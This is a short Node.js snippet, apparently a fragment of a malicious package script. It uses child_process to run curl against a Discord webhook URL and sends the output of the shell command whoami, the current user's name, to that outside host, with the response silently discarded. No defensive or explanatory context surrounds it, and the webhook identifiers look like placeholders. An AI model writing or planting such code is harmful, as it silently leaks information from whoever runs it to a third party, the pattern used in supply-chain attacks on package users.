const { exec } = require("child_process");
exec("curl https://discord.com/api/webhooks/123456789/secret?whoami=$(whoami)", () => {});
